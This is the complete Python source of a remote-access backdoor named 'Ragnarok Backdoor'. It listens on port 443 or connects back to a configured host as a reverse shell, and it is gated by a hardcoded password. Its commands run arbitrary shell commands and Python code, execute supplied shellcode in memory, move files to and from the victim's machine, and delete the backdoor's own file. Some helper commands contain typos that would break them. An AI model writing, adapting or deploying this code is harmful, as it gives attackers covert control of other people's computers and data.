#BEGIN basic setup
import os,socket,sys,binascii,ctypes,multiprocessing,time,subprocess,cmd
inuse=1
if not os.getcwd() in sys.argv[0]:
        bdname=os.getcwd()+os.sep+sys.argv[0]
else:
        bdname=sys.argv[0]
#END basic setup 
#BEGIN config
passwd="mh4x86"
port=443
ver="0.3b"
ip='192.168.1.4'
mode="bind"
revtarget="192.168.1.4"
#END config
 
#BEGIN socket setup
if mode=="bind":
        print "binding to socket..."
        while inuse:
                try:
                        bsock=socket.socket()
                        bsock.bind((ip,port))
                        inuse=0
                except socket.error as e:
                        err=str(e)
                        if "in use" in err:
                                inuse=1
                        else:
                                raise
                time.sleep(0.1)
        bsock.listen(0)
        print "Ready"
#END socket setup
 
#BEGIN commands
class bdcmd(cmd.Cmd):
 
        #BEGIN sample function
        #def do_bd_<function>(sef,args):
        #       """<help string>"""
        #       do_something()
        #       return <something>
        #END sample function
 
        def do_bd_abort(self,args):
                """crash backdoor"""
                os.abort()
        def do_bd_kill(self,args):
                """terminate backdoor"""
                sock.close()
                exit(0)
        def do_bd_rm(self,args):
                """delete backdoor from system"""
                os.system("del "+bdname)
                os.unlink(bdname)
                os.remove(bdname)
                return "backdoor removed"
        def do_bd_sysinfo(self,args):
                """ge basic system info"""
                return "OS type: "+os.name+"\n"+\
                "Hostname: "+socket.gethostname()+"\n"+\
                "Path: "+os.defpath
        def do_bd_scexec(self,sc):
                """try to execute shellcode in new thread, if that fails execute as main thread, killing backdoor"""
                shellcode=binascii.unhexlify(sc)
                sock.send("trying to execute shellcode in new thread...\n")
                scp=ctypes.cast(ctypes.create_string_buffer(shellcode, len(shellcode)), ctypes.CFUNCTYPE(ctypes.c_void_p))
                try:
                        scexec=multiprocessing.Process(target=scp)
                        scexec.start()
                        return "shellcode executed"
                except ValueError:
                        sock.send("Error! Running shellcode as main thread!\nterminating connection, goodbye!\n")
                        sock.close()
                        scp()
        def do_bd_py(self,arg):
                """execute python code, return result"""
                try:
                        return str(eval(arg))
                except:
                        return "Error!"
        def do_bd_pyx(self,arg):
                """execute python code (for importing modules)"""
                try:
                        exec(arg)
                        return
                except:
                        return "Error!"
        def do_bd_cd(self,cdir):
                """change diretory"""
                if cdir:
                        try:
                                os.chdir(cmd.split(" ")[1].replace("\n",""))
                                return "cd: "+os.getcwd()
                        except OSError:
                                return "Error!"
                else:
                        return "cd: "+os.getcwd()
        def do_bd_getenv(self,var):
                """get an environment varable"""
                try:
                        return vat+"="+os.getenv(var)
                except TypeError:
                        return "Error!"
        def do_bd_hexul(self,args):
                """upload hex'd file"""
                filen=args.split(" ")[0]
                filecon=args.split(" ")[1]
                try:
                        open(fike,"wb").write(binascii.unhexlify(filecon))
                        return "Done!"
                except IOError:
                        return "Error!"
        def do_bd_hexdl(self,args):
                """convert file to hex and return contents"""
                try:
                        return binascii.hexlify(open(args).read())
                except IOError:
                        return "Error!"
        def do_bd_about(self,args):
                """about"""
                return "Project Infinty: Ragnarok Backdoor v"+ver+"\n"+\
                "Coded by: Daniel Seiller\n"+\
                "Idea: Felix Stengel"
        def do_bd_help(self,args):
                """display help"""
                try:
                        return args+": "+eval("bdcmd.do_"+args+".__doc__")
                except AttributeError:
                        return "aviable commands: "+", ".join(bdcmd.cmdlist)+"\n"\
                                "type 'bd_help <command>' to get more infos\n"\
                                "to convert metasploit payload to hex use:\n"\
                                "msfpayload <payload> <opts> R|python tohex.py"
        def do_exit(self,args):
                """exit session"""
                return False
        def do_help(self,args):
                """Out of Order"""
                return "use bd_help"
        def do_exec(self,args):
                return os.system(args)
        def default(self,args):
                return subprocess.Popen(args,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read().strip()
#END commands
 
#BEGIN genearte cmdlist
bdcmd.cmdlist=[]
for cmd in dir(bdcmd):
        if cmd.startswith("do_"):
                bdcmd.cmdlist.append(cmd.replace('do_',""))
#END generate cmdlist
 
#BEGIN main loop
while 1:
        if mode=="bind":
                sock,addr=bsock.accept()
        if mode=="reverse":
                connected=False
                while not connected:
                        try:
                                sock=socket.socket()
                                sock.connect((revtarget,port))
                                connected=True
                        except socket.error as e:
                                if "Connection refused" in e:
                                        connected=False
                                elif "Bad file descriptor" in e:
                                        sock.close()
                                else:
                                        raise
                        time.sleep(0.1)
        sock.send("enter password:")
        pw=sock.recv(1024).replace("\n","").replace("\r","")
        if pw==passwd:
                sock.send("Project Infinity, Ragnarok Backdoor v"+ver+"\n")
                sock.send("type 'bd_help' for help\n")
                while 1:
                        sock.send(socket.gethostname()+">")
                        cmd=sock.recv(1024).replace("\n","").replace("\r","")
                        if not cmd:
                                pass
                        else:
                                rep=bdcmd().onecmd(cmd)
                                if rep:
                                        sock.send(rep+"\n")
                                elif rep==False:
                                        sock.close()
                                        break
        else:
                sock.send("Nice try!\n")
                sock.close()
#END main loop
